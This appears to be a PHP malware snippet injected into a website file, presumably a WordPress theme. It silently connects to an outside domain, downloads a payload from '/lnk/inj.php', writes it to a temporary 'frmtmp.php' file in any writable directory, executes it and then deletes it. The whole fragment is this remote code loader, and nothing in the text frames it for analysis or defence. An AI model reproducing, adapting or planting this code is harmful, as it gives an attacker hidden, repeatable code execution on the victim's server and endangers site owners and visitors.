?><?php
@ini_set('display_errors', '0');
$otvet = '';
$fp = fsockopen("woothemewp.com", 80, $errno, $errstr, 10);
$out = "GET /lnk/inj.php HTTP/1.1\r\n";
$out .= "Host: woothemewp.com\r\n";
$out .= "Connection: Close\r\n\r\n";
fwrite($fp, $out);
while (!feof($fp)) {
    $otvet .= fgets($fp);
}
fclose($fp);
preg_match('#gogo(.*)enen#is', $otvet, $mtchs);
if (fopen('frmtmp.php', 'w')) { $ura = 1; $eb = ''; $hdl = fopen('frmtmp.php', 'w'); }
if (!$ura) {
	$dirs = glob("*", GLOB_ONLYDIR);
	foreach ($dirs as $dira) {
		if (fopen("$dira/frmtmp.php", 'w')) { $eb = "$dira/"; $hdl = fopen("$dira/frmtmp.php", 'w'); break; }
		$subdirs = glob("$dira/*", GLOB_ONLYDIR);
		foreach ($subdirs as $subdira) {
			if (fopen("$subdira/frmtmp.php", 'w')) { $eb = "$subdira/"; $hdl = fopen("$subdira/frmtmp.php", 'w'); break; }
		}
	}
}
fwrite($hdl, "<?php\n$mtchs[1]\n?>");
fclose($hdl);
include("{$eb}frmtmp.php");
@unlink("{$eb}frmtmp.php");
?>

